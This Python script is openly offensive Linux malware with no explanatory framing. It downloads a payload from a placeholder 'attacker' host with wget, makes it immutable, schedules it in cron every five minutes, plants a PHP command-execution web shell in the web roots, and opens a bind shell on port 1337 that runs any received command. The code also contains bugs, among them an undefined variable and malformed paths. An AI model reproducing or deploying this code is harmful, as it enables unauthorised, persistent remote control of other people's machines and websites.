#!/usr/bin/env python
import subprocess
import socket
import sys
import os

LHOST = "0.0.0.0"
LPORT = 1337
PAYLOAD_URL = "http://attacker/paryload"
PAYLOAD_NAME = "payload"

def persistence():
	#DROPPER /tmp/
	try:
		os.popen("wget %s -O /tmp/%s" % (PAYLOAD,PAYLOAD_NAME))	
		os.popen("chmod +x /tmp/%s" % (PAYLOAD_NAME))
		os.popen("chattr +i /tmp/%s" % (PAYLOAD_NAME))
		os.popen("./tmp/%s &" % (PAYLOAD_NAME))
	except:
		pass
	try:
		os.popen("echo '*/5 * * * *  /tmp/%s' > /tmp/cron" % (PAYLOAD_NAME))
		os.popen("chattr +i /tmp/cron")
		os.popen("crontab /tmp/cron")
	except:
		pass
	#DROPPER /usr/bin
	try:
		os.popen("wget %s -O /usr/bin/%s" % (PAYLOAD,PAYLOAD_NAME))	
		os.popen("chmod +x /usr/bin/%s" % (PAYLOAD_NAME))
		os.popen("chattr +i /usr/bin/%s" % (PAYLOAD_NAME))
		os.popen("./usr/bin/%s &" % (PAYLOAD_NAME))
	except:
		pass
	try:
		os.popen("echo '*/5 * * * *  /usr/bin/%s' > /usr/bin/cron" % (PAYLOAD_NAME))
		os.popen("chattr +i /usr/bin/cron")
		os.popen("crontab /usr/bin/cron")
	except:
		pass
	
	#PHP Backdoor
	webroot = ["/var/www/","/var/www/html/"]
	for www in webroot:
		try:
			os.popen("echo '<?php if(isset($_REQUEST[\"cmd\"])){$cmd = ($_REQUEST[\"cmd\"]);system($cmd);echo \"</pre>$cmd<pre>\";die;}?>' > %s%s.php" % (www,PAYLOAD_NAME))	
			os.popen("chmod +x %s%s.php" % (www,PAYLOAD_NAME))
			os.popen("chattr +i %s%s.php" % (www,PAYLOAD_NAME))
		except:
			pass

	
def listen():
	while True:
        	try:
	                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	                s.bind((LHOST,LPORT))
	                s.listen(4)
	                while True:
	                        c,addr=s.accept()
	                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n"%(addr[0],LPORT))
	                        c.send('[!] Remote Shell Installed Successfully.\n\n')
	                        for tym in range(0,50):
	                                data=c.recv(1024)
	                                for line in os.popen(data):
	                                        c.send(line)
        	except KeyboardInterrupt:
	                c.send("\n\t[ctrl+c] server forcely closed by Victim.\n")
	                s.close()
	                sys.exit(1)
        	except socket.error:
	                s.close()

if __name__ == "__main__":
	persistence()
	listen()
